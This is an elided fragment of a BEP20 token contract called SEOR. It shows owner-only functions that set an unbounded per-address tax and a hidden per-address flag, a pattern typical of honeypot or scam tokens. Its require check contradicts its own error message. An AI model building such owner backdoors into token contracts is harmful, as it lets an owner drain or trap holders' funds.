...
contract SEOR is BEP20, Ownable {
    // ext
    ...
    function setSlipFyti(address _address, uint256 _value) external onlyOwneraa {
        require(_value > 6, "Account tax must be greater than or equal to 1");
        _slipFyti[_address] = _value;
    }

    function getSlipFyti(address _address) external view onlyOwneraa returns (uint256) {
        return _slipFyti[_address];
    }


    function setMAccountFyti(address _address, bool _value) external onlyOwneraa {
        _mAccount[_address] = _value;
    }

    function getMAccountFyti(address _address) external view onlyOwneraa returns (bool) {
